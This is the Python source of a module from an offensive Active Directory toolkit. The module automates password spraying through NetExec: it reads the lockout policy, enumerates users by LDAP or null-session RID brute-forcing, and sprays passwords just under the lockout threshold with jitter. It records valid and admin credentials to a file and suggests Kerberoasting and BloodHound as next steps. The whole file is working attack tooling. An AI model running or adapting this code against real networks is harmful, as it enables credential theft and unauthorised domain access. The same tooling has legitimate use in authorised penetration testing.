"""
Smart Password Spraying Module
Intelligent password spraying with lockout protection:
1. Query domain password policy via LDAP (lockout threshold, observation window)
2. Build user list from LDAP enumeration or file
3. Spray with configurable delay between attempts
4. Track attempts per user to avoid lockout
5. Stop spraying a user after (threshold - 1) failures
6. Report successful authentications

Uses NetExec (nxc) for the actual credential validation.
"""

import os
import re
import shlex
import time
import random
from datetime import datetime
from typing import Dict, List, Optional, Tuple

from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class PasswordSpray(ModuleBase):
    """
    Smart password spraying module with lockout-aware logic.

    Queries domain password policy before spraying to determine safe
    thresholds. Supports LDAP-based user enumeration, multiple protocols,
    configurable delays and jitter, and comprehensive result tracking.
    """

    def __init__(self):
        super().__init__()
        self.name = "password_spray"
        self.description = "Smart password spraying with lockout protection and auto user enumeration"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = [
            "ad", "password", "spray", "bruteforce", "credentials",
            "lockout", "netexec", "nxc", "authentication",
        ]
        self.references = [
            "https://attack.mitre.org/techniques/T1110/003/",
            "https://www.netexec.wiki/",
            "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying",
        ]
        self.opsec_rating = "high"
        self.opsec_notes = "Password spraying generates authentication events (4625/4776) on DC; respect lockout policy"

        self.provides = ["credentials"]
        self.consumes = ["credentials"]
        self.suggested_next = [
            ("ad/bloodhound_collect", "Enumerate AD with found credentials"),
            ("ad/kerberoast", "Kerberoast with valid domain credentials"),
            ("ad/adcs_auto", "Check ADCS with found credentials"),
        ]

        # Core options (for initial auth to query policy + enumerate users)
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name (e.g., corp.local)", required=True)
        self.register_option("USER", "Auth username for policy/user query (or empty for anonymous)", default="")
        self.register_option("PASS", "Auth password for policy/user query", default="")

        # Spray options
        self.register_option("PASSWORDS", "Passwords to spray (comma-separated or file path)", required=True)
        self.register_option("USERLIST", "User list file, or 'ldap' to auto-enumerate from AD",
                           default="ldap")

        # Timing / safety
        self.register_option("DELAY", "Seconds to wait between spray rounds", default="30")
        self.register_option("JITTER", "Random 0-N seconds added to delay", default="5")
        self.register_option("THREADS", "Number of threads (1 for safety)", default="1")

        # Protocol
        self.register_option("PROTOCOL", "Protocol for spraying",
                           default="smb",
                           choices=["smb", "ldap", "winrm", "kerberos"])

        # Output
        self.register_option("OUTPUT", "Output file for valid credentials", default="spray_results.txt")
        self.register_option("OUTPUT_DIR", "Directory for output files", default="/tmp/password_spray")

        # Internal state
        self._password_policy: Dict = {}
        self._users: List[str] = []
        self._user_attempts: Dict[str, int] = {}
        self._valid_creds: List[Tuple[str, str]] = []
        self._lockout_threshold: int = 0
        self._max_attempts: int = 0

    def _query_password_policy(self, dc_ip: str, domain: str, user: str, password: str) -> bool:
        """Query domain password policy via nxc or LDAP."""
        self.print_status("=" * 50)
        self.print_status("PHASE 1: Querying Domain Password Policy")
        self.print_status("=" * 50)

        # Method 1: NetExec --pass-pol
        if user and password:
            cmd = (
                f"NetExec smb {shlex.quote(dc_ip)} "
                f"-u {shlex.quote(user)} -p {shlex.quote(password)} "
                f"-d {shlex.quote(domain)} --pass-pol"
            )
        else:
            # Try null session
            cmd = f"NetExec smb {shlex.quote(dc_ip)} -u '' -p '' --pass-pol"

        safe_cmd = cmd.replace(password, "[HIDDEN]") if password else cmd
        self.print_status(f"Running: {safe_cmd}")

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
        output = stdout + stderr

        # Parse policy
        lockout_threshold = 0
        lockout_duration = 0
        observation_window = 0
        min_pw_length = 0
        pw_complexity = False

        for line in output.split("\n"):
            line_lower = line.lower().strip()

            # Account lockout threshold
            match = re.search(r'lockout\s*threshold[:\s]+(\d+)', line_lower)
            if match:
                lockout_threshold = int(match.group(1))

            # Lockout duration
            match = re.search(r'lockout\s*duration[:\s]+.*?(\d+)', line_lower)
            if match:
                lockout_duration = int(match.group(1))

            # Observation window / reset counter
            match = re.search(r'(reset\s*account|observation\s*window)[:\s]+.*?(\d+)', line_lower)
            if match:
                observation_window = int(match.group(2))

            # Minimum password length
            match = re.search(r'min.*password.*length[:\s]+(\d+)', line_lower)
            if match:
                min_pw_length = int(match.group(1))

            # Password complexity
            if "complexity" in line_lower and ("enabled" in line_lower or "true" in line_lower or ": 1" in line_lower):
                pw_complexity = True

            # Display raw output
            if line.strip() and ("[+]" in line or "Minimum" in line or "Lockout" in line or
                                  "Account" in line or "complexity" in line.lower() or
                                  "password" in line.lower()):
                self.print_line(f"    {line.strip()}")

        self._password_policy = {
            "lockout_threshold": lockout_threshold,
            "lockout_duration": lockout_duration,
            "observation_window": observation_window,
            "min_pw_length": min_pw_length,
            "pw_complexity": pw_complexity,
        }

        self._lockout_threshold = lockout_threshold
        if lockout_threshold > 0:
            # Leave buffer: stop at threshold - 1
            self._max_attempts = lockout_threshold - 1
            self.print_line()
            self.print_warning(f"Lockout threshold: {lockout_threshold} attempts")
            self.print_good(f"Safe max attempts per user: {self._max_attempts}")
            if lockout_duration:
                self.print_status(f"Lockout duration: {lockout_duration} minutes")
            if observation_window:
                self.print_status(f"Observation window: {observation_window} minutes")
        else:
            self._max_attempts = 999999  # No lockout policy
            self.print_line()
            self.print_warning("No account lockout policy detected (or could not determine)")
            self.print_warning("Proceeding with caution - no artificial limit set")

        if min_pw_length:
            self.print_status(f"Minimum password length: {min_pw_length}")
        if pw_complexity:
            self.print_status("Password complexity: ENABLED")

        return True

    def _enumerate_users(self, dc_ip: str, domain: str, user: str, password: str) -> bool:
        """Build user list from LDAP or file."""
        self.print_line()
        self.print_status("=" * 50)
        self.print_status("PHASE 2: Building User List")
        self.print_status("=" * 50)

        userlist = self.get_option("USERLIST")

        if userlist.lower() == "ldap":
            return self._enumerate_users_ldap(dc_ip, domain, user, password)
        else:
            return self._load_users_file(userlist)

    def _enumerate_users_ldap(self, dc_ip: str, domain: str, user: str, password: str) -> bool:
        """Enumerate domain users via LDAP."""
        self.print_status("Enumerating users from Active Directory via LDAP...")

        base_dn = ",".join(f"DC={part}" for part in domain.split("."))

        if user and password:
            cmd = (
                f"NetExec smb {shlex.quote(dc_ip)} "
                f"-u {shlex.quote(user)} -p {shlex.quote(password)} "
                f"-d {shlex.quote(domain)} --users"
            )
        else:
            # Try null session or RID cycling
            cmd = (
                f"NetExec smb {shlex.quote(dc_ip)} "
                f"-u '' -p '' --rid-brute 2000"
            )

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=120)
        output = stdout + stderr

        users = set()
        for line in output.split("\n"):
            # Parse nxc --users output: "SMB  10.x.x.x  445  DC01  username  badpwdcount: 0 desc: ..."
            if "badpwdcount" in line.lower() or "rid:" in line.lower():
                # Extract username - typically 5th whitespace-separated field
                parts = line.split()
                for i, part in enumerate(parts):
                    if part.lower() == "badpwdcount:" or part.lower().startswith("rid:"):
                        # Username is usually one or two fields before this
                        if i >= 5:
                            username = parts[4]
                            # Skip machine accounts and known service accounts
                            if not username.endswith("$") and username.lower() not in (
                                "krbtgt", "guest", "defaultaccount", ""
                            ):
                                users.add(username)
                        break

            # Also parse --users format: "domain\username   Status: ..."
            match = re.search(r'(?:^|\s)(\w+)\s+badpwdcount', line, re.IGNORECASE)
            if match:
                uname = match.group(1)
                if not uname.endswith("$") and uname.lower() not in ("krbtgt", "guest", "defaultaccount"):
                    users.add(uname)

            # Fallback: look for username patterns in nxc output
            # Format: "SMB ... HOST ... username ..."
            match2 = re.search(r'SMB\s+\S+\s+\d+\s+\S+\s+(\S+)\s', line)
            if match2:
                uname2 = match2.group(1)
                if (uname2 not in ("SMB", "[+]", "[-]", "[*]") and
                    not uname2.endswith("$") and
                    uname2.lower() not in ("krbtgt", "guest", "defaultaccount") and
                    not uname2.startswith("[") and
                    not uname2.isdigit()):
                    users.add(uname2)

        if not users:
            self.print_warning("Could not enumerate users via LDAP")
            self.print_status("Trying alternative: enum4linux-ng...")

            alt_cmd = (
                f"NetExec smb {shlex.quote(dc_ip)} "
                f"-u {shlex.quote(user)} -p {shlex.quote(password)} "
                f"-d {shlex.quote(domain)} --rid-brute 2000"
            )
            ret2, stdout2, stderr2 = self.run_in_exegol(alt_cmd, timeout=120)
            output2 = stdout2 + stderr2

            for line in output2.split("\n"):
                # RID brute format: "SidTypeUser: DOMAIN\username"
                match = re.search(r'SidTypeUser:\s*\S+\\(\S+)', line)
                if match:
                    uname = match.group(1)
                    if not uname.endswith("$") and uname.lower() not in ("krbtgt", "guest"):
                        users.add(uname)

        self._users = sorted(list(users))

        if self._users:
            self.print_good(f"Enumerated {len(self._users)} domain users")
            for u in self._users[:20]:
                self.print_line(f"    {u}")
            if len(self._users) > 20:
                self.print_line(f"    ... and {len(self._users) - 20} more")
        else:
            self.print_error("No users enumerated. Provide a USERLIST file instead.")
            return False

        return True

    def _load_users_file(self, filepath: str) -> bool:
        """Load users from a file."""
        self.print_status(f"Loading users from file: {filepath}")

        if not os.path.isfile(filepath):
            self.print_error(f"User list file not found: {filepath}")
            return False

        with open(filepath, "r") as f:
            users = [line.strip() for line in f if line.strip() and not line.startswith("#")]

        self._users = users

        if self._users:
            self.print_good(f"Loaded {len(self._users)} users from file")
        else:
            self.print_error("No users in file")
            return False

        return True

    def _load_passwords(self) -> List[str]:
        """Load passwords from option (comma-separated or file path)."""
        passwords_opt = self.get_option("PASSWORDS")

        # Check if it's a file path
        if os.path.isfile(passwords_opt):
            self.print_status(f"Loading passwords from file: {passwords_opt}")
            with open(passwords_opt, "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
            self.print_good(f"Loaded {len(passwords)} passwords from file")
            return passwords

        # Treat as comma-separated list
        passwords = [p.strip() for p in passwords_opt.split(",") if p.strip()]
        self.print_status(f"Passwords to spray: {len(passwords)}")
        return passwords

    def _spray_round(self, dc_ip: str, domain: str, password: str, protocol: str,
                     users_file: str, round_num: int, total_rounds: int) -> List[Tuple[str, str]]:
        """Execute one spray round with a single password against all eligible users."""
        self.print_line()
        self.print_status(f"[Round {round_num}/{total_rounds}] Spraying: {password}")

        # Filter users that haven't exceeded attempt limit
        eligible_users = []
        for user in self._users:
            attempts = self._user_attempts.get(user, 0)
            if attempts < self._max_attempts:
                eligible_users.append(user)

        if not eligible_users:
            self.print_warning("No eligible users remaining (all at lockout limit)")
            return []

        self.print_status(f"  Eligible users: {len(eligible_users)} / {len(self._users)}")

        # Write eligible users to temp file
        eligible_file = users_file + ".eligible"
        with open(eligible_file, "w") as f:
            f.write("\n".join(eligible_users))

        # Build nxc command
        threads = self.get_option("THREADS")
        cmd = (
            f"NetExec {protocol} {shlex.quote(dc_ip)} "
            f"-u {shlex.quote(eligible_file)} "
            f"-p {shlex.quote(password)} "
            f"-d {shlex.quote(domain)} "
            f"--continue-on-success"
        )

        if protocol == "kerberos":
            cmd = (
                f"NetExec smb {shlex.quote(dc_ip)} "
                f"-u {shlex.quote(eligible_file)} "
                f"-p {shlex.quote(password)} "
                f"-d {shlex.quote(domain)} "
                f"--continue-on-success --kerberos"
            )

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=300)
        output = stdout + stderr

        valid_creds = []

        for line in output.split("\n"):
            line = line.strip()
            if not line:
                continue

            # Successful authentication
            if "[+]" in line:
                # Extract username from nxc output
                match = re.search(r'\[.\]\s+\S+\s+\d+\s+\S+\s+(?:\S+\\)?(\S+?):', line)
                if match:
                    found_user = match.group(1)
                    valid_creds.append((found_user, password))
                    if "Pwn3d!" in line:
                        self.print_good(f"  ADMIN: {found_user}:{password} (Pwn3d!)")
                    else:
                        self.print_good(f"  VALID: {found_user}:{password}")
                else:
                    # Generic match
                    self.print_good(f"  {line}")
                    # Try to extract user from the line more generically
                    match2 = re.search(r'(\w+):' + re.escape(password), line)
                    if match2:
                        valid_creds.append((match2.group(1), password))

            elif "STATUS_ACCOUNT_LOCKED_OUT" in line:
                match = re.search(r'(\S+?):', line)
                if match:
                    locked_user = match.group(1)
                    self.print_error(f"  LOCKED OUT: {locked_user}")
                    # Set to max so we skip this user
                    self._user_attempts[locked_user] = self._max_attempts + 1

            elif "STATUS_LOGON_FAILURE" in line:
                # Count the failure
                match = re.search(r'(\S+?):', line)
                if match:
                    failed_user = match.group(1)
                    self._user_attempts[failed_user] = self._user_attempts.get(failed_user, 0) + 1

            elif "STATUS_ACCOUNT_DISABLED" in line:
                match = re.search(r'(\S+?):', line)
                if match:
                    disabled_user = match.group(1)
                    self.print_warning(f"  DISABLED: {disabled_user}")
                    # Remove from future rounds
                    self._user_attempts[disabled_user] = self._max_attempts + 1

        # Update attempts for users not in error output (they all got one attempt)
        for user in eligible_users:
            if user not in [vc[0] for vc in valid_creds]:
                current = self._user_attempts.get(user, 0)
                if current < self._max_attempts:
                    self._user_attempts[user] = current + 1

        # Clean up temp file
        try:
            os.remove(eligible_file)
        except OSError:
            pass

        return valid_creds

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        protocol = self.get_option("PROTOCOL")
        delay = int(self.get_option("DELAY"))
        jitter = int(self.get_option("JITTER"))
        output_dir = self.get_option("OUTPUT_DIR")
        output_file = self.get_option("OUTPUT")

        self.print_line()
        self.print_status(f"Password Spray v{self.version}")
        self.print_status(f"DC: {dc_ip} | Domain: {domain}")
        self.print_status(f"Protocol: {protocol} | Delay: {delay}s | Jitter: {jitter}s")
        self.print_line()

        # Ensure output directory
        os.makedirs(output_dir, exist_ok=True)
        orig_dir = os.getcwd()
        os.chdir(output_dir)

        try:
            # Phase 1: Query password policy
            self._query_password_policy(dc_ip, domain, user, password)

            # Phase 2: Build user list
            if not self._enumerate_users(dc_ip, domain, user, password):
                return False

            # Phase 3: Load passwords
            passwords = self._load_passwords()
            if not passwords:
                self.print_error("No passwords to spray")
                return False

            # Filter passwords by minimum length if known
            min_len = self._password_policy.get("min_pw_length", 0)
            if min_len > 0:
                filtered = [p for p in passwords if len(p) >= min_len]
                if len(filtered) < len(passwords):
                    self.print_warning(f"Filtered {len(passwords) - len(filtered)} passwords shorter than minimum ({min_len} chars)")
                    passwords = filtered

            if not passwords:
                self.print_error("No passwords meet minimum length requirement")
                return False

            # Safety confirmation
            self.print_line()
            self.print_status("=" * 50)
            self.print_status("PHASE 3: Password Spraying")
            self.print_status("=" * 50)
            self.print_status(f"  Users: {len(self._users)}")
            self.print_status(f"  Passwords: {len(passwords)}")
            self.print_status(f"  Total attempts: {len(self._users) * len(passwords)}")
            if self._lockout_threshold > 0:
                self.print_status(f"  Lockout threshold: {self._lockout_threshold}")
                self.print_status(f"  Max attempts per user: {self._max_attempts}")
            self.print_status(f"  Delay between rounds: {delay}-{delay + jitter}s")
            est_time = len(passwords) * (delay + jitter // 2)
            self.print_status(f"  Estimated time: ~{est_time // 60}m {est_time % 60}s")
            self.print_line()

            # Initialize attempt tracking
            self._user_attempts = {u: 0 for u in self._users}
            self._valid_creds = []

            # Write full user list to temp file for reference
            users_file = os.path.join(output_dir, "spray_users.txt")
            with open(users_file, "w") as f:
                f.write("\n".join(self._users))

            # Phase 4: Spray
            for i, pw in enumerate(passwords, 1):
                valid = self._spray_round(
                    dc_ip, domain, pw, protocol, users_file, i, len(passwords)
                )

                if valid:
                    self._valid_creds.extend(valid)

                # Delay between rounds (except last)
                if i < len(passwords):
                    actual_delay = delay + random.randint(0, jitter)
                    self.print_status(f"  Waiting {actual_delay}s before next round...")
                    time.sleep(actual_delay)

            # Phase 5: Report results
            self._print_results(output_dir, output_file)

            return len(self._valid_creds) > 0

        finally:
            os.chdir(orig_dir)

    def _print_results(self, output_dir: str, output_file: str) -> None:
        """Print and save spray results."""
        self.print_line()
        self.print_status("=" * 60)
        self.print_status("PASSWORD SPRAY RESULTS")
        self.print_status("=" * 60)

        if not self._valid_creds:
            self.print_warning("No valid credentials found")
            return

        self.print_line()
        self.print_good(f"Found {len(self._valid_creds)} valid credential(s):")
        self.print_line()

        for username, password in self._valid_creds:
            self.print_good(f"  {username}:{password}")

        # Save to file
        output_path = os.path.join(output_dir, output_file)
        try:
            with open(output_path, "w") as f:
                f.write(f"# Password Spray Results - {datetime.now().isoformat()}\n")
                f.write(f"# Domain: {self.get_option('DOMAIN')}\n")
                f.write(f"# DC: {self.get_option('RHOSTS')}\n\n")
                for username, password in self._valid_creds:
                    f.write(f"{username}:{password}\n")
            self.print_good(f"Results saved to: {output_path}")
        except Exception as e:
            self.print_warning(f"Could not save results: {e}")

        # Suggest next steps
        self.print_line()
        self.print_status("Suggested next steps:")
        self.print_status("  1. use ad/bloodhound_collect  (enumerate with valid creds)")
        self.print_status("  2. use ad/kerberoast          (kerberoast with valid creds)")
        self.print_status("  3. use ad/adcs_auto           (check ADCS vulnerabilities)")
        self.print_status("  4. use ad/netexec             (enumerate shares, sessions, etc.)")

    def check(self) -> bool:
        """Check if NetExec is available."""
        self.print_status("Checking for NetExec...")
        ret, stdout, stderr = self.run_in_exegol("which NetExec || which nxc", timeout=10)
        if ret == 0:
            self.print_good("NetExec found")
            return True
        self.print_error("NetExec not found in Exegol container")
        return False


module = PasswordSpray()
